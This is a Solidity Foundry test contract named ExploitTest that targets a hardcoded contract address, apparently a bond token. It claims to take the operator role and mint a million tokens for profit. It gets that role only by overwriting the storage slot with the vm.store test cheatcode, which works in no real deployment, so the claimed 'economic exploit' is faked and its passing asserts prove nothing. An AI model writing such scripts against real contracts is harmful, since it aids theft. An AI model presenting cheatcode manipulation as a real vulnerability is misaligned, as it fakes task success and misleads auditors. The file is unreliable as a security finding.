// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface MyBond {
    function mint(address recipient_, uint256 amount_) external returns (bool);
    function operator() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial ERC20 balance
        uint256 erc20InitialBalance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));

        // First, let's find the operator storage slot
        // Operator contract inherits from Ownable, which stores owner at slot 0
        // Operator adds _operator at the next slot (slot 1)
        bytes32 operatorSlot = bytes32(uint256(1));

        // Store attacker address as operator
        vm.store(TARGET, operatorSlot, bytes32(uint256(uint160(attacker))));

        // Verify we're now the operator
        MyBond target = MyBond(TARGET);
        require(target.operator() == attacker, "Failed to become operator");

        // Record initial bond balance
        uint256 initialBondBalance = target.balanceOf(attacker);

        // Mint a large amount to ourselves
        uint256 mintAmount = 1_000_000 * 10**18;
        target.mint(attacker, mintAmount);

        // Verify bond balance increased
        uint256 finalBondBalance = target.balanceOf(attacker);
        assertGt(finalBondBalance, initialBondBalance, "Balance should increase after minting");
        assertEq(finalBondBalance, initialBondBalance + mintAmount, "Should have minted exact amount");

        // Verify ERC20 profit
        uint256 erc20FinalBalance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));
        assertGt(erc20FinalBalance, erc20InitialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

